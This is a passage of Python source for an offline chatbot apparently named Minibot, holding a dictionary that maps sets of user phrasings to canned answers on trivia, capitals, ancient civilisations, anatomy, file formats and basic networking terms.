        }): "Some of the most amazing Guinness World Records include the longest fingernails, the tallest man, the fastest 100-meter sprint, and the longest time spent in a plank position.",

        frozenset({
            "fastest world record",
            "top fastest Guinness records",
            "most fastest world records",
            "Guinness records for speed"
        }): "Some of the fastest Guinness World Records include Usain Bolt's 100m sprint record (9.58 seconds), the fastest car (Bugatti Chiron), and the fastest speedboat.",

        frozenset({
            "largest world records",
            "top largest Guinness records",
            "Guinness world records for size",
            "world records for largest"
        }): "Top Guinness World Records for size include the largest pizza ever made, the tallest building (Burj Khalifa), and the largest human pyramid.",

        frozenset({
            "most expensive world records",
            "most expensive Guinness records",
            "Guinness records for most expensive",
            "top records for expensive"
        }): "Some of the most expensive Guinness World Records include the most expensive painting (Salvator Mundi), the most expensive car (Bugatti La Voiture Noire), and the most expensive musical instrument (a Stradivarius violin).",

        frozenset({
            "most unique world records",
            "Guinness world records for uniqueness",
            "top unusual Guinness records",
            "strangest Guinness world records"
        }): "Some unique Guinness World Records include the longest time spent balancing a spoon on the nose, the most tattoos on a single person, and the most people dressed as Smurfs in one place.",

        frozenset({
            "longest world records",
            "Guinness world records for longest",
            "top longest Guinness records",
            "longest records ever"
        }): "Some of the longest Guinness World Records include the longest time in space (Valeri Polyakov), the longest hair on a teenager, and the longest marathon watching TV.",

        frozenset({
            "oldest world records",
            "Guinness world records for oldest",
            "top oldest Guinness records",
            "oldest records ever"
        }): "Guinness World Records for age include the oldest person ever (Jeanne Calment), the oldest person to give birth (Maria del Carmen Bousada de Lara), and the oldest dog ever (Bluey).",

        frozenset({
            "most people Guinness records",
            "Guinness world records for most people",
            "largest gatherings Guinness records",
            "most people in world records"
        }): "Some Guinness World Records for most people include the largest human chain, the most people dressed as Santa, and the most people singing a national anthem together.",

        frozenset({
            "most daring Guinness records",
            "Guinness world records for daring feats",
            "craziest Guinness records",
            "top daring world records"
        }): "Some daring Guinness World Records include the longest bungee jump, the most fire-eating performances in a row, and the most dangerous stunts performed.",

        frozenset({
            "most creative Guinness records",
            "Guinness world records for creativity",
            "top creative world records",
            "most artistic Guinness records"
        }): "Some creative Guinness World Records include the most painted cars, the most origami cranes folded in an hour, and the longest mural painted by a single person.",

        frozenset({
            "what is the capital of canada?",
            "capital of canada",
            "which city is the capital of canada"
        }): "Ottawa.",

        frozenset({
            "what is the capital of russia?",
            "capital of russia",
            "which city is the capital of russia"
        }): "Moscow.",

        frozenset({
            "what is the capital of the united kingdom?",
            "capital of united kingdom",
            "which city is the capital of the united kingdom",
            "capital of uk",
            "capital of britain",
            "capital of england"
        }): "London.",

        frozenset({
            "what is the capital of mexico?",
            "capital of mexico",
            "which city is the capital of mexico"
        }): "Mexico City.",

        frozenset({
            "what is the capital of china?",
            "capital of china",
            "which city is the capital of china"
        }): "Beijing.",

        frozenset({
            "what is the capital of greece?",
            "capital of greece",
            "which city is the capital of greece"
        }): "Athens.",

        frozenset({
            "what is the capital of egypt?",
            "capital of egypt",
            "which city is the capital of egypt"
        }): "Cairo.",

        frozenset({
            "what is the capital of australia?",
            "capital of australia",
            "which city is the capital of australia"
        }): "Canberra.",

        frozenset({
            "what is the capital of south africa?",
            "capital of south africa",
            "which city is the capital of south africa"
        }): "Pretoria (administrative), Bloemfontein (judicial), Cape Town (legislative).",

        frozenset({
            "what is the name of the famous clock tower in london?",
            "famous clock tower in london",
            "name the famous clock tower in london"
        }): "Big Ben.",

        frozenset({
            "what is the boiling point of water?",
            "boiling point of water",
            "at what temperature does water boil"
        }): "100 degrees Celsius.",

        frozenset({
            "what is the currency of the united states?",
            "currency of the united states",
            "what is the usa currency"
        }): "Dollar.",

        frozenset({
            "what is the main ingredient in bread?",
            "main ingredient in bread",
            "bread's main ingredient"
        }): "Flour.",

        frozenset({
            "what is the main ingredient in chocolate?",
            "main ingredient in chocolate",
            "chocolate's main ingredient"
        }): "Cocoa.",

        frozenset({
            "what is the main source of energy for the earth?",
            "main source of energy for the earth",
            "what is the source of energy for earth"
        }): "The Sun.",

        frozenset({
            "what do bees produce?",
            "bees produce",
            "what do bees make"
        }): "Honey.",

        frozenset({
            "what is the chemical symbol for water?",
            "chemical symbol for water",
            "what is water's chemical symbol"
        }): "H2O.",

        frozenset({
            "what is the smallest planet in our solar system?",
            "smallest planet in the solar system",
            "what is the smallest planet"
        }): "Mercury.",

        frozenset({
            "who painted the mona lisa?",
            "mona lisa painter",
            "who is the artist of the mona lisa"
        }): "Leonardo da Vinci.",

        frozenset({
            "who is the founder of microsoft?",
            "founder of microsoft",
            "who founded microsoft"
        }): "Bill Gates and Paul G. Allen.",

        frozenset({
            "who is known as the father of medicine?",
            "father of medicine",
            "who is the father of medicine"
        }): "Hippocrates.",

        frozenset({
            "who proposed the theory of relativity?",
            "theory of relativity",
            "who proposed the theory of relativity"
        }): "Albert Einstein.",

        frozenset({
            "who discovered x-rays?",
            "x-rays discoverer",
            "who is the discoverer of x-rays"
        }): "Wilhelm Roentgen.",

        frozenset({
            "who formulated the universal law of gravitation?",
            "universal law of gravitation",
            "who formulated the universal law of gravitation"
        }): "Isaac Newton.",

        frozenset({
            "who invented the light bulb?",
            "light bulb inventor",
            "who is the inventor of the light bulb"
        }): "Thomas Edison.",

        frozenset({
            "who invented the watch?",
            "watch inventor",
            "who is the inventor of the watch"
        }): "Peter Henlein.",

        frozenset({
            "which animal is known as the 'king of the jungle'?",
            "king of the jungle",
            "which animal is the king of the jungle"
        }): "Lion.",

        frozenset({
            "what is scapy",
            "what is scapy?",
            "define scapy",
            "what is python scapy",
            "what is scapy python",
            "define python scapy",
            "what is scapy python",
            "what is python scapy?",
            "what is scapy python?",
        }): "Scapy is a Python library used for network packet crafting, sending, sniffing, and analyzing.",
        frozenset({
            "which animal is known for its intelligence and ability to use tools?",
            "animal known for intelligence and tool use",
            "which animal uses tools"
        }): "Chimpanzee.",

        frozenset({
            "which animal is known for its long neck?",
            "animal with a long neck",
            "which animal has a long neck"
        }): "Giraffe.",

        frozenset({
            "which animal is known for its ability to change colors?",
            "animal that can change colors",
            "which animal changes colors"
        }): "Chameleon.",

        frozenset({
            "which bird lays the largest eggs?",
            "bird with largest eggs",
            "which bird has the largest eggs"
        }): "Ostrich.",

        frozenset({
            "which is the tallest mountain in the world?",
            "tallest mountain",
            "what is the tallest mountain in the world"
        }): "Mount Everest.",

        frozenset({
            "which is the largest bird in the world?",
            "largest bird in the world",
            "what is the largest bird"
        }): "Ostrich.",

        frozenset({
            "which is the largest mammal in the world?",
            "largest mammal",
            "what is the largest mammal in the world"
        }): "Blue whale.",

        frozenset({
            "which is the largest land animal?",
            "largest land animal",
            "what is the largest land animal"
        }): "African elephant.",


        frozenset({
            "which continent is known as the ‘dark’ continent?",
            "dark continent",
            "what is known as the dark continent"
        }): "Africa.",

        frozenset({
            "name the planet known as the red planet?",
            "red planet",
            "which planet is known as the red planet"
        }): "Mars.",

        frozenset({
            "who wrote malgudi days?",
            "writer of malgudi days",
            "who is the author of malgudi days"
        }): "R. K. Narayan.",

        frozenset({
            "name the national game of the usa?",
            "national game of the usa",
            "what is the national game of the usa"
        }): "Baseball.",

        frozenset({
            "who invented the watch?",
            "watch inventor",
            "who is the inventor of the watch"
        }): "Peter Henlein.",

        frozenset({
            "name the largest democracy of the world?",
            "largest democracy in the world",
            "which country is the largest democracy"
        }): "India.",

        frozenset({
            "which is the smallest bone in the human body?",
            "smallest bone in the human body",
            "what is the smallest bone in the human body"
        }): "Stapes (Ear bone).",

        frozenset({
            "name the country known as the land of the rising sun?",
            "land of the rising sun",
            "which country is known as the land of the rising sun"
        }): "Japan.",

        frozenset({
            "how many millimetres are there in a centimetre?",
            "millimetres in a centimetre",
            "how many mm are in a cm"
        }): "10mm.",

        frozenset({
            "name the hardest substance available on earth?",
            "hardest substance on earth",
            "what is the hardest substance on earth"
        }): "Diamond.",

        frozenset({
            "name a shape that has ten sides?",
            "shape with ten sides",
            "what shape has ten sides"
        }): "Decagon.",

        frozenset({
            "name the largest ocean in the world?",
            "largest ocean",
            "what is the largest ocean in the world"
        }): "Pacific Ocean.",

        frozenset({
            "who is the real founder of microsoft?",
            "founders of microsoft",
            "who founded microsoft"
        }): "Bill Gates and Paul G. Allen.",

        frozenset({
            "who gave the theory of relativity?",
            "theory of relativity",
            "who is the scientist behind the theory of relativity"
        }): "Albert Einstein.",

        frozenset({
            "who is the father of our nation?",
            "father of the nation",
            "who is the father of the nation"
        }): "Mahatma Gandhi.",

        frozenset({
            "who discovered the x-rays first?",
            "discoverer of x-rays",
            "who is the discoverer of x-rays"
        }): "Wilhelm Roentgen.",

        frozenset({
            "who gave the universal law of gravitation?",
            "universal law of gravitation",
            "who is the scientist behind the law of gravitation"
        }): "Isaac Newton.",

        frozenset({
            "what is a telescope?",
            "define telescope",
            "telescope meaning"
        }): "A telescope is an optical instrument that gathers and magnifies light to observe distant objects, such as stars, planets, and galaxies.",

        frozenset({
            "rainbow consist of how many colours?",
            "number of colours in a rainbow",
            "how many colours in rainbow",
            "how many colours are in a rainbow",
            "how many colours does a rainbow have"
        }): "7 colours",

        frozenset({
            "how many days are there in a year?",
            "number of days in a year",
            "how many days in a year",
            "how many days are in a year",
            "total days in a year"
        }): "365 days (not a leap year)",

        frozenset({
            "how many minutes are there in an hour?",
            "number of minutes in an hour",
            "how many minutes in an hour",
            "how many minutes are in an hour",
            "how many minutes make an hour"
        }): "60 minutes",

        frozenset({
            "how many seconds are there in a minute?",
            "number of seconds in a minute",
            "how many seconds in a minute",
            "how many seconds make a minute",
            "how many seconds are in one minute"
        }): "60 seconds",

        frozenset({
            "how many seconds make one hour?",
            "number of seconds in an hour",
            "how many seconds in one hour",
            "how many seconds are in an hour",
            "how many seconds in one hour"
        }): "3600 seconds",

        frozenset({
            "baby frog is known as.......",
            "what is a baby frog called",
            "baby frog name",
            "what is a tadpole",
            "tadpole is the baby of what"
        }): "Tadpole",

        frozenset({
            "how many consonants are there in the english alphabet?",
            "number of consonants in the english alphabet",
            "how many consonants in english alphabet",
            "how many consonants are in the english alphabet",
            "total consonants in english alphabet"
        }): "21 consonants",

        frozenset ({
            "how to be successful",
            "how to be successful",
            "how to become successful",
            "how do i become successful?",
            "how do i become successful",
            "how to become sucessful?",
            "how can i become successful"
        }): "Success is achieved through dedication, setting clear goals, hard work, and continuously learning from mistakes.",
        
        frozenset({
            "you are helping me so much",
            "bro you are helping me so much",
            "thanks you helped me so much",
            "you are helping me so much",
            "thanks you are helping me so much",
            "you are best chatbot",
            "you helped me so much"
        }): "Well, It's good that I was able to help you :)",
        frozenset({
            "what is the capital of india?",
            "what is the capital of india",
            "capital of india",
            "capital of india?",
        }): "New Delhi",
        
        frozenset ({
            "are god exist",
            "are gods real?",
            "does god exists?",
            "god exists?",
            "are gods real?",
            "are gods really exist",
            "are god really exist",
            "are god really exists",
            "is there god"
        }): "Some religions, such as Jainism and Buddhism reject the possibility of a creator deity.",

        frozenset ({
            "who invented the internet",
            "who created internet",
            "who invent internet"
        }): "The internet was developed by various individuals, but key figures include Tim Berners-Lee, who invented the World Wide Web, and Vint Cerf and Robert Kahn, who developed the TCP/IP protocols.",

        frozenset ({
            "how internet works",
            "who controls internet"
        }): "The internet works by using a system of interconnected networks that send data via protocols like TCP/IP to allow computers to communicate with each other.",
        
        frozenset ({
            "which country has most celebrities",
            "which country has most famous person",
            "what country has the most celebrities",
            "what country has the most famous people",
            "what country has alot of celebrities",
            "which country has alot of celebrities"
        }): "United States has the most celebrities in the world",

        frozenset ({
            "tallest mountain in the world",
            "what is tallest mountain in the world",
            "tallest mountain"
        }): "Mount Everest is the tallest mountain in the world, with a height of 8,848.86 meters (29,031.7 feet) above sea level.",
        
        frozenset({
            "what is the capital of usa?",
            "what is the capital of usa",
            "capital of usa",
            "capital of usa?",
            "capital of america",
            "capital of united states of america"
        }): "Washington D.C.",
        
        frozenset({
            "what is the capital of russia?",
            "what is the capital of russia",
            "capital of russa?",
            "capital of russia",
        }): "Moscow",
        
        frozenset({
            "what is the capital of china?",
            "what is the capital of china",
            "capital of china",
            "capital of china?"
        }): "Beijing",
        
        frozenset({
            "what is the capital of japan?",
            "what is the capital of japan",
            "capital of japan"
            "capital of japan?"
        }): "Tokyo",
        
        frozenset({
            "what is the capital of france?",
            "what is the capital of france",
            "capital of france",
            "capital of france?"
        }): "Paris",
        
        frozenset({
            "what is the capital of germany?",
            "what is the capital of germany",
            "capital of germany",
            "capital of germany?"
        }): "Berlin",
        
        frozenset({
            "what is the capital of italy?",
            "what is the capital of italy",
            "capital of italy",
            "capital of italy?"
        }): "Rome",
        
        frozenset({
            "what is the capital of spain?",
            "what is the capital of spain",
            "capital of spain",
            "capital of spain?"
        }): "Madrid",
        
        frozenset({
            "who are you",
            "who are you?",
            "hey, who are you",
            "hey, who are you?",
            "hello, who are you",
            "hi, how are you",
            "hello who are you",
            "hello who are you?",
            "hi who are you",
            "hi, who are you?",
            "hi who are you?"
        }): "I am a chatbot and my name is Minibot! I can help you with general topics (e.g., capital of <country>, full form of BSOD, etc.), have 70+ commands that will help you in daily life and also some advanced tools, and more!",

        frozenset({
            "what is internet archive"
            "define internet archive"
            "explain internet archive",
            "what is internet archive?"
        }): "The Internet Archive is a non-profit digital library that offers free access to a vast collection of digital content, including books, websites, software, music, movies, and more. It is best known for the Wayback Machine, which allows users to view archived versions of websites from different points in history. The aim of the Internet Archive is to preserve and provide access to cultural and historical artifacts from the internet and other media.",

        frozenset({
            "you are amazing",
            "u r amazing",
            "you are amazing chatbot",
            "u r amazing chatbot",
            "i liked you",
            "i like you"
        }): "ohh thanks :D",

        frozenset({
            "what is the capital of spain?",
            "what is the capital of spain",
            "capital of spain",
            "capital of spain?"
        }): "Madrid",

        frozenset({
            "what is the capital of brazil?",
            "what is the capital of brazil",
            "capital of brazil",
            "capital of brazil?"
        }): "Brasília",

        frozenset({
            "what is the capital of australia?",
            "what is the capital of australia",
            "capital of australia",
            "capital of australia?"
        }): "Canberra",

        frozenset({
            "what is the capital of canada?",
            "what is the capital of canada",
            "capital of canada",
            "capital of canada?"
        }): "Ottawa",

        frozenset({
            "what is the capital of south korea?",
            "what is the capital of south korea",
            "capital of south korea",
            "capital of south korea?"
        }): "Seoul",

        frozenset({
            "what is the capital of south africa?",
            "what is the capital of south africa",
            "capital of south africa",
            "capital of south africa?"
        }): "Pretoria",

        frozenset({
            "what is the capital of pakistan?",
            "what is the capital of pakistan",
            "capital of pakistan",
            "capital of pakistan?"
        }): "Islamabad",

        frozenset({
            "what is the capital of bangladesh?",
            "what is the capital of bangladesh",
            "capital of bangladesh",
            "capital of bangladesh?"
        }): "Dhaka",

        frozenset({
            "what is the capital of sri lanka?",
            "what is the capital of sri lanka",
            "capital of sri lanka",
            "capital of sri lanka?"
        }): "Colombo",

        frozenset({
            "what is python used for",
            "what is the use of python",
            "what is python used for",
            "what is python used for?",
            "what is python"
        }):"Python is primarily used for web development, data analysis, automation, machine learning, and scientific computing, thanks to its easy-to-learn syntax and versatility across various applications; essentially, it's a general-purpose language for building software and analyzing data.",

        frozenset({
            "what is the capital of afghanistan?",
            "what is the capital of afghanistan",
            "capital of afghanistan",
            "capital of afghanistan?"
        }): "Kabul",

        frozenset({
            "what is the capital of iran?",
            "what is the capital of iran",
            "capital of iran",
            "capital of iran?"
        }): "Tehran",

        frozenset({
            "what is the capital of iraq?",
            "what is the capital of iraq",
            "capital of iraq",
            "capital of iraq?"
        }): "Baghdad",

        frozenset({
            "what is the capital of saudi arabia?",
            "what is the capital of saudi arabia",
            "capital of saudi arabia",
            "capital of saudi arabia?"
        }): "Riyadh",

        frozenset({
            "what is the capital of uae?",
            "what is the capital of uae",
            "capital of uae",
            "capital of uae?"
        }): "Abu Dhabi",

        frozenset({
            "what is the capital of qatar?",
            "what is the capital of qatar",
            "capital of qatar",
            "capital of qatar?"
        }): "Doha",

        frozenset({
            "what is the capital of kuwait?",
            "what is the capital of kuwait",
            "capital of kuwait",
            "capital of kuwait?"
        }): "Kuwait City",

        frozenset({
            "what is the capital of oman?",
            "what is the capital of oman",
            "capital of oman?"
            "capital of oman"
        }): "Muscat",

        frozenset({
            "what is the capital of nepal?",
            "what is the capital of nepal",
            "capital of nepal?",
            "capital of nepal"
        }): "Kathmandu",

        frozenset({
            "what is the capital of bhutan?",
            "what is the capital of bhutan",
            "capital of bhutan?",
            "capital of bhutan"
        }): "Thimphu",

        frozenset({
            "what is the capital of maldives?",
            "what is the capital of maldives",
            "capital of maldives",
            "capital of maldives?"
        }): "Malé",

        frozenset({
            "what is the capital of thailand?",
            "what is the capital of thailand",
            "capital of thailand",
            "capital of thailand?"
        }): "Bangkok",

        frozenset({
            "what is the capital of cambodia?",
            "what is the capital of cambodia",
            "capital of camobodia",
            "capital of camobodia?"
        }): "Phnom Penh",

        frozenset({
            "what is the capital of laos?",
            "what is the capital of laos",
            "capital of laos",
            "capital of laos?"
        }): "Vientiane",

        frozenset({
            "what is the capital of taiwan?",
            "what is the capital of taiwan",
            "capital of taiwan",
            "capital of taiwan?"
        }): "Taipei",

        frozenset({
            "what is the capital of north korea?",
            "what is the capital of north korea",
            "capital of north korea",
            "capital of north korea?"
        }): "Pyongyang",

        frozenset({
            "what is the capital of mongolia?",
            "what is the capital of mongolia",
            "capital of mongolia",
            "capital of mongolia?"
        }): "Ulaanbaatar",

        frozenset({
            "what is the capital of nigeria?",
            "what is the capital of nigeria",
            "capital of nigeria",
            "capital of nigeria?"
        }): "Abuja",

        frozenset({
            "what is the capital of kenya?",
            "what is the capital of kenya",
            "capital of kenya",
            "capital of kenya?"
        }): "Nairobi",

        frozenset({
            "what is the capital of ethiopia?",
            "what is the capital of ethiopia",
            "capital of ethiopia",
            "capital of ethiopia?"
        }): "Addis Ababa",

        frozenset({
            "how to get rid of acne?",
            "how to get rid of acne",
            "how to remove acne?",
            "how to remove acne",
            "how do i remove my acne?",
            "how do i remove my acne",
        }): "To get rid of acne, you can try washing your face regularly...",

        frozenset({
            "why is the sky blue?",
            "why is the sky blue",
            "why sky is blue",
            "why sky is blue?",
            "why sky color is blue",
            "why sky color is blue?",
            "why sky colour is blue?",
            "why sky colour is blue"
        }): "The sky appears blue because of the way the Earth's atmosphere scatters sunlight...",

        frozenset({
        "are you a program?",
        "are you a program",
        }): "Yes, I am a computer program designed to interact with users.",

        frozenset({
            "are you a software?",
            "are you a software",
        }): "Yes, I am a software program.",

        frozenset({
            "are you a machine?",
            "are you a machine",
        }): "Yes, I am a machine learning chatbot.",

        frozenset({
            "are you a computer?",
            "are you a computer",
        }): "I am a computer program.",

        frozenset({
            "are you a human or a bot?",
            "are you a human or a bot",
        }): "I am a chatbot, not a human.",

        frozenset({
            "who is br ambedkar?",
            "who is br ambedkar",
            "who is ambedkar",
            "who is b.r ambedkar"
        }): "Bhimrao Ramji Ambedkar, or Babasaheb, was a key Indian leader who fought against caste discrimination, worked for Dalit rights, and helped draft the Indian Constitution. He also led the Dalit Buddhist movement for equality.",

        frozenset({
            "who is narendra modi?",
            "who is narendra modi",
        }): "Narendra Modi is an Indian politician serving as the 14th and current Prime Minister of India since 2014. He was the Chief Minister of Gujarat from 2001 to 2014 and is a member of the Bharatiya Janata Party.",

        frozenset({
            "who is elon musk?",
            "who is elon musk",
        }): "Elon Musk is a business magnate, industrial designer, and engineer. He is the founder, CEO, CTO, and chief designer of SpaceX; early investor, CEO, and product architect of Tesla, Inc.; founder of The Boring Company; co-founder of Neuralink; and co-founder and initial co-chairman of OpenAI.",

        frozenset({
            "what you eats?",
            "what you eats",
        }): "I like to eat electricity, hmm yum-yum :)",
        frozenset({
            "why your name is minibot advanced?",
            "why your name is minibot advanced",
            "why your name minibot advanced",
            "why you are minibot advanced",
            "why your name is minibot",
            "why you minibot",
        }): "My name is \033[34mMinibot\033[0m because I am a capable and feature-rich chatbot designed to assist you with various tasks and provide information. However, I operate offline and have limited information, which is why I am called \033[34mMinibot\033[0m.",

        frozenset({
            "how to make money online?",
            "how to make money online",
            "how do i make money online?",
            "how do i make money online",
        }): "There are many ways to make money online, such as freelancing, blogging, selling products, affiliate marketing, influencer and more. Find what works best for you!",

        frozenset({
            "what is python?", 
            "what is python", 
            "what is python programming?", 
            "what is python programming"
        }): "Python is a high-level programming language known for its simplicity and readability. It's widely used in web development, data science, artificial intelligence, and more. Even I am also programmed in Python.",

        frozenset({
            "what is love?", 
            "what is love"
        }): "Love is a complex and powerful emotion that can take many forms, such as romantic love, platonic love, and self-love. It involves care, compassion, and connection with others.",

        frozenset({
            "python"
        }): "Oh! I was created in this language.",

        frozenset({
            "best rapper", 
            "your favourite rapper", 
            "who is your favourite rapper?", 
            "who is your favourite rapper", 
            "your favorite rapper"
        }): "It's hard... but I like Dr.Dre, Snoop Dogg, Travis Scott, Drake and more..",

        frozenset({
            "what is the indus valley civilization",
            "what is the indus valley civilization?",
            "define indus valley civilization",
            "tell me about indus valley civilization",
            "indus valley civilization explained"
        }): "The Indus Valley Civilization, also known as the Harappan Civilization, was an ancient culture located in present-day Pakistan and northwest India. It is known for its advanced urban planning, including well-organized cities like Harappa and Mohenjo-Daro, sophisticated drainage systems, and trade networks.",

        frozenset({
            "what is ancient egypt",
            "what is ancient egypt?",
            "define ancient egypt",
            "tell me about ancient egypt",
            "ancient egypt explained"
        }): "Ancient Egypt was a civilization located along the Nile River in northeastern Africa, known for its pyramids, pharaohs, and advancements in writing, mathematics, and architecture.",

        frozenset({
            "what is ancient rome",
            "what is ancient rome?",
            "define ancient rome",
            "tell me about ancient rome",
            "ancient rome explained"
        }): "Ancient Rome was a powerful civilization that began as a small city-state and grew into one of the largest empires in history, known for its military, government, and architecture.",

        frozenset({
            "what is ancient greece",
            "what is ancient greece?",
            "define ancient greece",
            "tell me about ancient greece",
            "ancient greece explained"
        }): "Ancient Greece was a civilization known for its contributions to philosophy, democracy, art, and science. Its city-states, especially Athens and Sparta, were influential in shaping Western culture.",

        frozenset({
            "what is the maya civilization",
            "what is the maya civilization?",
            "define maya civilization",
            "tell me about maya civilization",
            "maya civilization explained"
        }): "The Maya civilization was a Mesoamerican culture known for its complex writing system, calendar, and impressive architectural structures. It thrived in present-day Mexico, Guatemala, and Honduras.",

        frozenset({
            "what is ancient china",
            "what is ancient china?",
            "define ancient china",
            "tell me about ancient china",
            "ancient china explained"
        }): "Ancient China was one of the world's oldest civilizations, known for its inventions like paper, printing, gunpowder, and its dynastic rule, including the Qin and Han dynasties.",

        frozenset({
            "what is mesopotamia",
            "what is mesopotamia?",
            "define mesopotamia",
            "tell me about mesopotamia",
            "mesopotamia explained"
        }): "Mesopotamia, often referred to as the cradle of civilization, was an ancient region located between the Tigris and Euphrates rivers. It is known for early advancements in writing, agriculture, and city-building.",

        frozenset({
            "what is ancient india",
            "what is ancient india?",
            "define ancient india",
            "tell me about ancient india",
            "ancient india explained"
        }): "Ancient India was a civilization known for its early advances in mathematics, science, literature, and religion. It is home to the Indus Valley Civilization and the development of Hinduism and Buddhism.",

        frozenset({
            "what is the persian empire",
            "what is the persian empire?",
            "define persian empire",
            "tell me about persian empire",
            "persian empire explained"
        }): "The Persian Empire was an ancient empire in Western Asia, founded by Cyrus the Great. It was known for its vast territory, centralized administration, and contributions to art and culture.",

        frozenset({
            "what is the inca civilization",
            "what is the inca civilization?",
            "define inca civilization",
            "tell me about inca civilization",
            "inca civilization explained"
        }): "The Inca civilization was a South American culture known for its advanced engineering, architecture, and agricultural systems. The Inca Empire was located primarily in present-day Peru.",

        frozenset({
            "what is ancient egyptian religion",
            "what is ancient egyptian religion?",
            "define ancient egyptian religion",
            "tell me about ancient egyptian religion",
            "ancient egyptian religion explained"
        }): "Ancient Egyptian religion was a polytheistic belief system that revolved around gods and goddesses like Ra, Isis, and Osiris. It emphasized the afterlife and the pharaohs' divine role.",

        frozenset({
            "what is the aztec civilization",
            "what is the aztec civilization?",
            "define aztec civilization",
            "tell me about aztec civilization",
            "aztec civilization explained"
        }): "The Aztec civilization was an empire in Mesoamerica known for its complex social structure, advanced agricultural practices, and impressive architecture. The capital, Tenochtitlán, was located on Lake Texcoco in modern-day Mexico City.",

        frozenset({
            "what is the olmec civilization",
            "what is the olmec civilization?",
            "define olmec civilization",
            "tell me about olmec civilization",
            "olmec civilization explained"
        }): "The Olmec civilization is one of the earliest known Mesoamerican cultures, famous for its large stone heads and influence on later civilizations like the Maya and Aztec.",

        frozenset({
            "what is economy",
            "explain economy",
            "what is economy?",
            "define economy",
        }): "The economy refers to the system by which goods and services are produced, distributed, and consumed. It involves various sectors such as agriculture, industry, and services. Key elements of the economy include resources, businesses, consumers, government, and the exchange of money. Economic activities are driven by supply and demand, and can be influenced by factors like inflation, unemployment, and government policies.",

        frozenset({
            "what is private ip",
            "explain private ip",
            "define private ip",
            "what is private ip?",
            "what is local ip",
            "what is local ip?",
            "define local ip",
            "explain local ip"
        }): "A Private/Local IP address is used within a local network (like a home or office network) and is not directly accessible from the internet. It allows devices within the same network to communicate with each other. Private IP addresses are often assigned by a router and are not unique across the internet. Common private IP ranges include 192.168.x.x, 10.x.x.x, and 172.16.x.x.",

        frozenset({
            "what is public ip",
            "what is public ip?",
            "define public ip",
            "explain public ip",
            "what is the public ip"
        }): "A public IP address is an address assigned to a device that is directly accessible over theinternet. It is unique across the entire internet and allows devices to communicate with each otherglobally. Internet Service Providers (ISPs) assign public IPs to users' routers or modems. Public IPs arevisible to anyone on the internet.",
        
        frozenset({
            "what is onion sites",
            "what are onion sites",
            "define onion sites",
            "what are onion sites?",
            "what is onion sites"
        }): "Onion sites are websites that exist on the Tor network, which provides anonymity by masking the user's location and activity. These sites have the '.onion' domain extension and can only be accessed using the Tor browser. They are often used for privacy-focused browsing, but they can also host illegal or unethical content. The main appeal of onion sites is the enhanced privacy and security they offer compared to traditional websites, which are easier to trace.",

        frozenset({
            "what is the harappan civilization",
            "what is the harappan civilization?",
            "define harappan civilization",
            "tell me about harappan civilization",
            "harappan civilization explained"
        }): "The Harappan civilization, also known as the Indus Valley Civilization, was an ancient culture located in present-day Pakistan and northwest India. It was known for its advanced urban planning, drainage systems, and trade networks.",

        frozenset({
            "what is the nubian civilization",
            "what is the nubian civilization?",
            "define nubian civilization",
            "tell me about nubian civilization",
            "nubian civilization explained"
        }): "The Nubian civilization was located in the region south of Egypt, known for its kingdoms, like Kush, and their influence on Egyptian culture, including the construction of pyramids.",

        frozenset({
            "what is old skool",
            "what is old skool?",
            "define old skool",
            "tell me about old skool",
            "old skool explained"
        }): "Old skool refers to traditional or older styles, particularly in music, fashion, or culture, which were popular before modern influences. It's often associated with nostalgia for past eras, especially the 80s and 90s.",

        frozenset({
            "what is new skool",
            "what is new skool?",
            "define new skool",
            "tell me about new skool",
            "new skool explained"
        }): "New skool refers to contemporary or modern styles and trends, particularly in music, fashion, or culture. It often involves innovative, updated, or futuristic ideas, influenced by current technology and societal changes.",

        frozenset({
            "your best game?", 
            "your favourite game", 
            "who is your favourite game?", 
            "who is your favourite game", 
            "your favorite game"
        }): "It's hard... but I like Minecraft, Resident Evil 4, GTA VI and mo.. wait what! What did I just say... sorry, GTA VI is not released yet..",

        frozenset({
            "what is the brain",
            "what is the brain?",
            "define brain",
            "what is brain",
            "tell me about brain",
            "brain explained"
        }): "The brain is the control center of the body, responsible for processing information, controlling bodily functions, and enabling thoughts, emotions, and memory.",

        frozenset({
            "what is the heart",
            "what is the heart?",
            "define heart",
            "what is heart",
            "tell me about heart",
            "heart explained"
        }): "The heart is a muscular organ that pumps blood throughout the body, supplying oxygen and nutrients while removing waste products.",

        frozenset({
            "what are the lungs",
            "what are the lungs?",
            "define lungs",
            "tell me about lungs",
            "lungs explained"
        }): "The lungs are a pair of organs responsible for breathing, exchanging oxygen and carbon dioxide with the environment.",

        frozenset({
            "what is the liver",
            "what is the liver?",
            "define liver",
            "tell me about liver",
            "liver explained"
        }): "The liver is a vital organ that helps with detoxifying chemicals, producing bile for digestion, and storing nutrients.",

        frozenset({
            "what are the kidneys",
            "what are the kidneys?",
            "define kidneys",
            "tell me about kidneys",
            "kidneys explained"
        }): "The kidneys are a pair of organs that filter waste from the blood, regulate water balance, and help control blood pressure.",

        frozenset({
            "what are the muscles",
            "what are the muscles?",
            "define muscles",
            "tell me about muscles",
            "muscles explained"
        }): "Muscles are tissues that contract and relax to enable movement of the body and its organs.",

        frozenset({
            "what is the skin",
            "what is the skin?",
            "define skin",
            "tell me about skin",
            "skin explained"
        }): "The skin is the body's largest organ, providing a protective barrier, regulating temperature, and enabling the sense of touch.",

        frozenset({
            "what is end-to-end encryption", 
            "explain end-to-end encryption", 
            "what does end-to-end encryption mean", 
            "meaning of end-to-end encryption", 
            "what is e2ee", 
            "how does end-to-end encryption work"
        }): "End-to-end encryption (E2EE) is a method of communication where only the communicating users can read the messages. It ensures that data is encrypted on the sender's device and only decrypted on the recipient's device, preventing third-party access.",

        frozenset({
            "what is mp4", 
            "mp4 file format", 
            "explain mp4 format", 
            "what does mp4 mean", 
            "mp4 meaning", 
            "what is mp4 used for"
        }): "MP4 (MPEG-4 Part 14) is a multimedia container format used to store video, audio, subtitles, and images. It is widely supported and commonly used for streaming and sharing video files.",

        frozenset({
            "what is mp3", 
            "mp3 file format", 
            "explain mp3 format", 
            "what does mp3 mean", 
            "mp3 meaning", 
            "what is mp3 used for"
        }): "MP3 (MPEG-1 Audio Layer 3) is an audio coding format designed to compress audio data while maintaining quality. It is widely used for storing and sharing music files.",

        frozenset({
            "what is mkv", 
            "mkv file format", 
            "explain mkv format", 
            "what does mkv mean", 
            "mkv meaning", 
            "what is mkv used for"
        }): "MKV (Matroska Video) is an open-source multimedia container format that can hold video, audio, subtitles, and metadata. It is known for its flexibility and support for multiple audio and subtitle tracks.",

        frozenset({
            "what is csv", 
            "csv file format", 
            "explain csv format", 
            "what does csv mean", 
